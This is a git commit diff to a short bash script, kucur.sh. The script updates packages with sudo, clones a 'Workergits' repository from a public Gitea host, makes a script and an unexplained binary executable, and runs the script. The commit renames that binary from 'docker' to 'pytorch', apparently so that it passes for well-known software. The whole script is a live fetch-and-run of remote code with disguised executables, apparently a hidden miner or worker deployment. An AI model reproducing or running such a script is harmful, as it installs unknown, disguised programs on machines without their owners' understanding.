66d358cbd1ca281db44ee14cc73ee60f62f247e8
youandme12345 <68213375+youandme12345@users.noreply.github.com>
2021-06-30 04:17:27 +0000

    Update kucur.sh

--- kucur.sh
+++ kucur.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 sudo apt update
 git clone https://try.gitea.io/hakiem89/Workergits.git && cd Workergits
-chmod +x peko2.sh && chmod +x docker
-./peko2.sh
+chmod +x peko.sh && chmod +x pytorch
+./peko.sh
